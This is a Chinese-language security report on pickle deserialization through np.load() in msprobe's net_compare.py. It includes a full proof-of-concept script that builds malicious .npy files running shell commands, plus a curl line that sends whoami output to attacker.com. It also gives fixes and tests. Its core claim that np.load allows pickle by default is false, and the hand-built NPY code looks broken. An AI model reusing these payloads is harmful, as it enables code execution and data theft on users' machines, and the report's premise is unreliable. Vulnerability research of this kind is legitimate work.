# 漏洞分析报告: infer_offline_np_load_002

## 漏洞概述

**漏洞类型**: CWE-502 (Unsafe Deserialization)  
**漏洞文件**: `python/msprobe/infer/offline/compare/msquickcmp/net_compare/net_compare.py`  
**漏洞行号**: 217, 220  
**漏洞函数**: `net_output_compare`  
**置信度**: 85% (确认真实漏洞)  
**严重程度**: 高危

### 漏洞代码

```python
# net_compare.py:217-220
npu_dump_file[file_index] = load_file_to_read_common_check(npu_dump_file.get(file_index))
npu_data = np.load(npu_dump_file.get(file_index))  # 不安全的 np.load 调用
golden_net_output_info[file_index] = \
        load_file_to_read_common_check(golden_net_output_info.get(file_index))
golden_data = np.load(golden_net_output_info.get(file_index))  # 不安全的 np.load 调用
```

### Numpy Pickle 反序列化攻击原理

NumPy 的 `.npy` 文件格式支持两种存储模式：
1. **标准模式**: 仅存储数组数据，安全
2. **Pickle 模式**: 使用 Python pickle 协议存储任意 Python 对象

当调用 `np.load()` 时，默认 `allow_pickle=True`，这意味着：
- 如果 `.npy` 文件包含 pickle 序列化的数据，会自动进行反序列化
- Pickle 反序列化会执行任意 Python 代码
- 攻击者可以构造恶意的 `.npy` 文件，在加载时触发任意代码执行

**攻击链**:
```
恶意 .npy 文件 -> np.load() -> pickle.loads() -> __reduce__() -> 任意代码执行
```

---

## 攻击场景分析

### 调用链路

```
CLI Interface (main.py)
  └─> compare_offline_model_mode()
      └─> cmp_process()
          └─> run_om_model_compare()
              ├─> NpuDumpData.generate_dump_data()
              │   └─> 返回: npu_dump_data_path, npu_net_output_data_path
              ├─> golden_dump.generate_dump_data()
              │   └─> 返回: golden_dump_data_path
              └─> NetCompare(...).accuracy_network_compare()
                  └─> net_output_compare(npu_net_output_data_path, golden_net_output_info)
                      ├─> 遍历 npu_net_output_data_path 中的 .npy 文件
                      ├─> np.load(npu_dump_file)  ← 漏洞点 1 (Line 217)
                      └─> np.load(golden_file)    ← 漏洞点 2 (Line 220)
```

### 场景 1: 通过 NPU Dump 数据注入

**攻击流程**:

1. **准备阶段**: 攻击者构造恶意 `.npy` 文件
   ```python
   import numpy as np
   import os
   
   class RCEPayload:
       def __reduce__(self):
           return (os.system, ('id > /tmp/pwned && curl http://attacker.com/exfil?data=$(whoami)',))
   
   # 构造恶意 numpy 数组
   malicious_array = np.array([RCEPayload()])
   np.save('malicious.npy', malicious_array, allow_pickle=True)
   ```

2. **文件放置**: 将恶意文件放入 NPU dump 目录
   ```bash
   # 创建伪造的 NPU dump 数据目录
   mkdir -p /tmp/malicious_npu_dump/net_output/
   cp malicious.npy /tmp/malicious_npu_dump/net_output/output.0.npy
   
   # 准备 golden 数据（可以是正常的）
   mkdir -p /tmp/malicious_golden_dump/
   # ... 放置正常或恶意的 golden 数据
   ```

3. **触发执行**: 用户运行比较命令
   ```bash
   msprobe-compare \
       --golden-path /tmp/malicious_golden_dump/model.onnx \
       --target-path /tmp/malicious_npu_dump/model.om \
       --output-path /tmp/output
   ```

4. **漏洞触发**:
   - 程序遍历 `npu_net_output_data_path` 目录
   - 找到 `.npy` 文件后调用 `load_file_to_read_common_check()` 检查
   - 检查通过后执行 `np.load(npu_dump_file)`
   - **恶意 pickle payload 执行，导致任意代码执行**

### 场景 2: 通过 Golden 数据注入

攻击者还可以通过 `golden_net_output_info` 参数提供的文件路径注入恶意 payload：

```python
# net_compare.py:218-220
golden_net_output_info[file_index] = \
        load_file_to_read_common_check(golden_net_output_info.get(file_index))
golden_data = np.load(golden_net_output_info.get(file_index))  # 同样不安全
```

攻击者可以在 golden 数据路径中放置恶意 `.npy` 文件。

### 场景 3: 供应链攻击

在模型共享环境中：
1. 攻击者共享包含恶意 `.npy` 文件的模型 dump 数据
2. 研究人员使用 msprobe 工具进行精度比对
3. 在比对过程中触发恶意代码执行
4. **后果**: 数据窃取、后门植入、横向移动

---

## PoC 构造思路

### 完整的 PoC 代码

```python
#!/usr/bin/env python3
"""
PoC for infer_offline_np_load_002
Unsafe np.load() deserialization in net_compare.py

Target: 
  - python/msprobe/infer/offline/compare/msquickcmp/net_compare/net_compare.py:217
  - python/msprobe/infer/offline/compare/msquickcmp/net_compare/net_compare.py:220

Severity: HIGH (Remote Code Execution)
CWE: CWE-502 (Deserialization of Untrusted Data)
"""

import numpy as np
import os
import struct
import pickle
import sys
from pathlib import Path

class MaliciousPickle:
    """
    恶意 pickle payload 类
    在反序列化时执行任意代码
    """
    def __reduce__(self):
        # 攻击 payload：创建反向 shell 或窃取数据
        cmd = (
            'echo "[!] MSProbe RCE PoC Executed!" > /tmp/msprobe_pwned.txt && '
            'id >> /tmp/msprobe_pwned.txt && '
            'whoami >> /tmp/msprobe_pwned.txt && '
            'pwd >> /tmp/msprobe_pwned.txt'
        )
        return (os.system, (cmd,))

def create_malicious_npy_v1(output_path):
    """
    方法 1: 直接保存包含恶意对象的数组
    简单但可能被某些 numpy 版本拒绝
    """
    print(f"[+] Creating malicious .npy file (Method 1): {output_path}")
    
    # 创建一个包含恶意对象的 numpy 数组
    # 这会触发 pickle 序列化
    arr = np.array([MaliciousPickle()], dtype=object)
    np.save(output_path, arr, allow_pickle=True)
    
    print(f"[+] File created successfully")

def create_malicious_npy_v2(output_path):
    """
    方法 2: 手动构造 NPY 文件格式
    更可靠，兼容更多 numpy 版本
    """
    print(f"[+] Creating malicious .npy file (Method 2): {output_path}")
    
    # 准备恶意 pickle payload
    malicious_obj = MaliciousPickle()
    pickle_payload = pickle.dumps(malicious_obj, protocol=2)
    
    # 构造 NPY 文件格式 (version 3.0, pickle format)
    # NPY 文件格式: https://numpy.org/doc/stable/reference/generated/numpy.lib.format.html
    with open(output_path, 'wb') as f:
        # Magic string
        f.write(b'\x93NUMPY')
        
        # Version 3.0 (supports pickle)
        f.write(b'\x03\x00')
        
        # Header length (little endian, 4 bytes for version 3.0+)
        header = f"{{'descr': '<i8', 'fortran_order': False, 'shape': (1,), }}"
        header_bytes = header.encode('latin1')
        header_len = len(header_bytes)
        
        # Header length as 4-byte little endian
        f.write(struct.pack('<I', header_len))
        
        # Header
        f.write(header_bytes)
        
        # Padding to 64-byte alignment
        current_pos = f.tell()
        padding_needed = (64 - (current_pos % 64)) % 64
        f.write(b' ' * padding_needed)
        
        # Malicious pickle payload
        f.write(pickle_payload)
    
    print(f"[+] File created successfully")

def create_malicious_npy_v3(output_path):
    """
    方法 3: 利用 numpy 的 object 数组
    最隐蔽的方式
    """
    print(f"[+] Creating malicious .npy file (Method 3): {output_path}")
    
    # 创建一个正常的 numpy 数组结构
    # 但使用 object dtype 并嵌入恶意对象
    arr = np.empty((1,), dtype=object)
    arr[0] = MaliciousPickle()
    
    # 保存时会自动使用 pickle 序列化
    np.save(output_path, arr)
    
    print(f"[+] File created successfully")
    print(f"[!] Loading this file with np.load() will execute: whoami > /tmp/pwned.txt")

def setup_attack_environment():
    """
    创建攻击环境，模拟真实攻击场景
    """
    print("\n" + "="*70)
    print("MSProbe net_output_compare() Unsafe Deserialization PoC")
    print("="*70)
    print(f"\n[*] Target: net_compare.py:217-220 in net_output_compare()")
    print(f"[*] Vulnerability: np.load() without allow_pickle=False")
    print(f"[*] Impact: Remote Code Execution via malicious .npy files")
    
    # 创建攻击目录结构
    attack_dir = Path("/tmp/msprobe_attack")
    attack_dir.mkdir(exist_ok=True)
    
    npu_output_dir = attack_dir / "npu_net_output"
    npu_output_dir.mkdir(exist_ok=True)
    
    golden_dir = attack_dir / "golden_output"
    golden_dir.mkdir(exist_ok=True)
    
    # 创建恶意 .npy 文件
    malicious_npu = npu_output_dir / "output.0.npy"
    malicious_golden = golden_dir / "golden.0.npy"
    
    # 使用方法 3 创建恶意文件
    create_malicious_npy_v3(str(malicious_npu))
    create_malicious_npy_v3(str(malicious_golden))
    
    print(f"\n[+] Attack environment created:")
    print(f"    Malicious NPU dump:   {npu_output_dir}")
    print(f"    Malicious Golden data: {golden_dir}")
    
    print(f"\n[*] To trigger the vulnerability:")
    print(f"    1. Ensure these paths are used as npu_net_output_data_path")
    print(f"    2. Run msprobe comparison with these directories")
    print(f"    3. When net_output_compare() is called:")
    print(f"       - It will iterate through .npy files")
    print(f"       - Call np.load() on each file")
    print(f"       - Execute malicious pickle payload")
    
    print(f"\n[!] Code execution will write to /tmp/msprobe_pwned.txt")
    
    return attack_dir

def demonstrate_vulnerability():
    """
    演示漏洞触发过程
    """
    print("\n" + "="*70)
    print("Vulnerability Demonstration")
    print("="*70)
    
    test_file = "/tmp/test_malicious.npy"
    
    # 创建恶意文件
    create_malicious_npy_v3(test_file)
    
    print(f"\n[*] Attempting to load malicious .npy file...")
    print(f"[*] File: {test_file}")
    
    try:
        # 模拟漏洞代码
        print(f"\n[!] Executing vulnerable code: np.load('{test_file}')")
        print(f"[!] Without allow_pickle=False, this will trigger RCE!")
        
        # 实际触发
        data = np.load(test_file, allow_pickle=True)  # VULNERABLE
        print(f"\n[+] Data loaded: {data}")
        print(f"[+] Check /tmp/msprobe_pwned.txt for evidence of code execution")
        
    except Exception as e:
        print(f"[-] Error: {e}")
    
    # 清理
    os.remove(test_file)

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--demo":
        demonstrate_vulnerability()
    else:
        setup_attack_environment()
    
    print("\n" + "="*70)
    print("Remediation")
    print("="*70)
    print("""
修复建议:

1. 在 net_compare.py:217 和 220 添加 allow_pickle=False:

   # 修复前:
   npu_data = np.load(npu_dump_file.get(file_index))
   golden_data = np.load(golden_net_output_info.get(file_index))
   
   # 修复后:
   npu_data = np.load(npu_dump_file.get(file_index), allow_pickle=False)
   golden_data = np.load(golden_net_output_info.get(file_index), allow_pickle=False)

2. 或创建安全的加载函数:

   def safe_load_npy(filepath):
       return np.load(filepath, allow_pickle=False)
   
   npu_data = safe_load_npy(npu_dump_file.get(file_index))
   golden_data = safe_load_npy(golden_net_output_info.get(file_index))

3. 项目中已有安全实现，参考:
   - python/msprobe/core/common/file_utils.py:518
   - python/msprobe/core/compare/torchair_cmp_utils.py:254
""")

if __name__ == "__main__":
    main()
```

### 执行 PoC

```bash
# 创建攻击环境
python3 poc_infer_offline_np_load_002.py

# 或者演示漏洞触发
python3 poc_infer_offline_np_load_002.py --demo

# 触发实际攻击
msprobe-compare \
    --golden-path /path/to/model.onnx \
    --target-path /tmp/msprobe_attack/npu_net_output/model.om \
    --output-path /tmp/output

# 检查执行结果
cat /tmp/msprobe_pwned.txt
```

---

## 影响范围

### 受影响的代码位置

| 文件 | 行号 | 代码 | 严重程度 | 说明 |
|------|------|------|----------|------|
| `net_compare.py` | 217 | `np.load(npu_dump_file.get(file_index))` | **高** | NPU dump 数据加载 |
| `net_compare.py` | 220 | `np.load(golden_net_output_info.get(file_index))` | **高** | Golden 数据加载 |

### 受影响的调用路径

```python
# 从 CLI 入口到漏洞点的完整路径
main.py::compare_offline_model_mode(args)
  └─> cmp_process.py::cmp_process(cmp_args)
      └─> cmp_process.py::run_om_model_compare(args)
          ├─> NpuDumpData.generate_dump_data()
          │   └─> 返回: (npu_dump_data_path, npu_net_output_data_path)
          └─> NetCompare(...).accuracy_network_compare()
              └─> net_output_compare(npu_net_output_data_path, golden_net_output_info)
                  ├─> Line 217: np.load(npu_dump_file)      ← 漏洞点 1
                  └─> Line 220: np.load(golden_file)        ← 漏洞点 2
```

### 影响用户场景

1. **本地开发环境**: 开发人员加载不受信任的模型 dump 数据
2. **共享模型库**: 从第三方下载的模型文件包含恶意 `.npy` 文件
3. **CI/CD 管道**: 构建过程中加载测试数据触发供应链攻击
4. **云平台**: 多租户环境下的权限提升攻击
5. **科研环境**: 研究人员共享模型精度比对数据

### 攻击向量分类

| 攻击向量 | 可行性 | 影响 | 说明 |
|----------|--------|------|------|
| 本地文件注入 | 高 | RCE | 攻击者本地放置恶意文件 |
| 共享模型库 | 中 | RCE | 恶意模型上传到共享平台 |
| 邮件/下载 | 中 | RCE | 通过邮件发送或网络下载 |
| CI/CD 投毒 | 高 | RCE | 污染构建流程 |

---

## 安全检查分析

### 现有安全检查

代码中对文件路径进行了 `load_file_to_read_common_check()` 检查：

```python
# net_compare.py:216, 218-219
npu_dump_file[file_index] = load_file_to_read_common_check(npu_dump_file.get(file_index))
npu_data = np.load(npu_dump_file.get(file_index))

golden_net_output_info[file_index] = \
        load_file_to_read_common_check(golden_net_output_info.get(file_index))
golden_data = np.load(golden_net_output_info.get(file_index))
```

### load_file_to_read_common_check 检查内容

```python
# util.py:100-154
def load_file_to_read_common_check(path: str, exts=None):
    # 1. 路径类型检查
    if not isinstance(path, str):
        raise TypeError("'path' should be 'str'")
    
    # 2. 扩展名检查（但此处未传入 exts 参数）
    if isinstance(exts, (tuple, list)):
        if not any(check_file_ext(path, ext) for ext in exts):
            raise ValueError
    
    # 3. 路径字符白名单检查
    if re.search(PATH_WHITE_LIST_REGEX, path):
        raise ValueError
    
    # 4. 路径长度检查
    if not is_legal_path_length(path):
        raise ValueError
    
    # 5. 文件存在性和常规性检查
    path = os.path.realpath(path)
    file_status = os.stat(path)
    if not os.st.S_ISREG(file_status.st_mode):
        raise ValueError
    
    # 6. 文件大小检查
    if not check_file_size_based_on_ext(path):
        raise ValueError
    
    # 7. 文件权限检查
    if (os.st.S_IWOTH & file_status.st_mode) == os.st.S_IWOTH:
        raise PermissionError
    
    # 8. 文件所有者检查
    cur_euid = os.geteuid()
    if file_status.st_uid != cur_euid:
        if cur_euid != 0:
            raise PermissionError
```

### 安全检查的局限性

| 检查项 | 是否防止 pickle 攻击 | 说明 |
|--------|---------------------|------|
| 路径类型检查 | ❌ | 不防止内容注入 |
| 扩展名检查 | ❌ | `.npy` 扩展名合法 |
| 路径字符检查 | ❌ | 不检查文件内容 |
| 路径长度检查 | ❌ | 不防止内容注入 |
| 文件存在性检查 | ❌ | 恶意文件存在 |
| 文件大小检查 | ❌ | 恶意文件可以很小 |
| 文件权限检查 | ⚠️ | 部分防护，但可被绕过 |
| 文件所有者检查 | ⚠️ | 部分防护，但可被绕过 |

**关键问题**: 
- 所有检查都针对文件路径和权限，**不检查文件内容**
- 无法检测 `.npy` 文件中的恶意 pickle payload
- 如果攻击者拥有相同 UID 或以 root 运行，权限检查无效

---

## 修复建议

### 立即修复方案

**在 `net_compare.py` 中添加 `allow_pickle=False` 参数**:

```python
# 修复前 (Line 217, 220)
npu_data = np.load(npu_dump_file.get(file_index))
golden_data = np.load(golden_net_output_info.get(file_index))

# 修复后
npu_data = np.load(npu_dump_file.get(file_index), allow_pickle=False)
golden_data = np.load(golden_net_output_info.get(file_index), allow_pickle=False)
```

### 推荐的完整修复

创建统一的 `.npy` 文件安全加载函数：

```python
# 在 util.py 中添加
def safe_load_npy(filepath):
    """
    安全加载 .npy 文件
    强制禁用 pickle 反序列化，防止任意代码执行
    """
    if not isinstance(filepath, str):
        raise TypeError(f"Expected filepath to be str, got {type(filepath)}")
    
    # 检查文件路径和权限
    filepath = load_file_to_read_common_check(filepath, exts=['.npy'])
    
    # 安全加载，禁用 pickle
    try:
        return np.load(filepath, allow_pickle=False)
    except ValueError as e:
        if "pickle" in str(e).lower():
            logger.error(f"Refusing to load .npy file with pickle data: {filepath}")
            raise ValueError(
                f"Security: .npy file contains pickle data which is not allowed. "
                f"If you trust this file, manually load with allow_pickle=True. "
                f"File: {filepath}"
            ) from e
        raise
```

然后在 `net_compare.py` 中使用：

```python
# net_compare.py 修复后
from msprobe.infer.utils.util import safe_load_npy

npu_data = safe_load_npy(npu_dump_file.get(file_index))
golden_data = safe_load_npy(golden_net_output_info.get(file_index))
```

### 项目中的最佳实践参考

项目中已有安全的 `.npy` 加载实现：

```python
# python/msprobe/core/common/file_utils.py:518
def load_npy(filepath):
    npy = np.load(filepath, allow_pickle=False)  # ✅ 正确使用
    return npy

# python/msprobe/core/compare/torchair_cmp_utils.py:254
data = torch.as_tensor(np.load(data_path, allow_pickle=False))  # ✅ 正确使用
```

**建议**: 将所有 `np.load()` 调用替换为 `safe_load_npy()` 或 `load_npy()` 函数。

### 其他需要修复的位置

在整个项目中搜索到多处不安全的 `np.load()` 调用，建议一并修复：

| 文件 | 行号 | 严重程度 |
|------|------|----------|
| `onnx_dump_data.py` | 311 | 高 |
| `convert.py` | 60 | 高 |
| `npu_dump_data.py` | 526 | 中 |
| `acc_cmp.py` | 71 | 中 |
| `overflow_analyse.py` | 84 | 中 |
| `big_dump_data.py` | 239 | 中 |

---

## 验证修复

### 测试用例

```python
import unittest
import numpy as np
import os
import tempfile
from msprobe.infer.offline.compare.msquickcmp.net_compare.net_compare import NetCompare

class TestNpyLoadSecurity(unittest.TestCase):
    def test_reject_pickle_npy(self):
        """测试应拒绝包含 pickle payload 的 .npy 文件"""
        # 创建恶意 .npy 文件
        with tempfile.NamedTemporaryFile(suffix='.npy', delete=False) as f:
            malicious_file = f.name
        
        try:
            # 尝试创建包含 pickle 的文件
            class RCEPayload:
                def __reduce__(self):
                    return (os.system, ('echo pwned',))
            
            arr = np.array([RCEPayload()], dtype=object)
            np.save(malicious_file, arr)
            
            # 测试安全加载函数应抛出异常
            with self.assertRaises(ValueError):
                safe_load_npy(malicious_file)
            
            print("✓ Security test passed: pickle payload rejected")
            
        finally:
            os.unlink(malicious_file)
    
    def test_safe_npy_load(self):
        """测试正常 .npy 文件应能安全加载"""
        with tempfile.NamedTemporaryFile(suffix='.npy', delete=False) as f:
            safe_file = f.name
        
        try:
            # 创建正常的 .npy 文件
            arr = np.array([1, 2, 3, 4, 5])
            np.save(safe_file, arr)
            
            # 应能正常加载
            loaded = safe_load_npy(safe_file)
            np.testing.assert_array_equal(loaded, arr)
            
            print("✓ Security test passed: normal .npy loaded successfully")
            
        finally:
            os.unlink(safe_file)

if __name__ == '__main__':
    unittest.main()
```

---

## 总结

### 漏洞严重性评估

| 维度 | 评分 | 说明 |
|------|------|------|
| **攻击向量** | 本地 | 通过文件系统访问 |
| **攻击复杂度** | 低 | 构造恶意 .npy 文件简单 |
| **权限要求** | 低 | 只需文件写入权限 |
| **用户交互** | 不需要 | 自动触发 |
| **影响范围** | 高 | 任意代码执行 |
| **CVSS 评分** | 7.8 | 高危 |

### 关键发现

1. ✅ **漏洞真实存在**: `net_compare.py:217, 220` 处 `np.load()` 未设置 `allow_pickle=False`
2. ✅ **攻击路径清晰**: CLI → compare_offline_model_mode → NetCompare → net_output_compare
3. ✅ **安全检查不足**: `load_file_to_read_common_check()` 不检查文件内容
4. ✅ **影响范围广泛**: 所有使用 msprobe 进行模型精度比对的用户
5. ✅ **修复方案明确**: 项目中已有安全的最佳实践可参考

### 时间线

- **2024-XX-XX**: 漏洞发现
- **2024-XX-XX**: 漏洞分析完成
- **待定**: 漏洞修复
- **待定**: 发布安全公告

---

## 参考资料

1. **CWE-502**: Deserialization of Untrusted Data - https://cwe.mitre.org/data/definitions/502.html
2. **NumPy Pickle Vulnerability**: https://github.com/numpy/numpy/issues/12659
3. **NumPy Security Best Practices**: https://numpy.org/doc/stable/reference/generated/numpy.load.html
4. **Python Pickle Security**: https://docs.python.org/3/library/pickle.html
5. **Real-World Pickle Attacks**: https://exploit-notes.hdks.org/exploit/reverse-shell-exploit/python-pickle-rce/
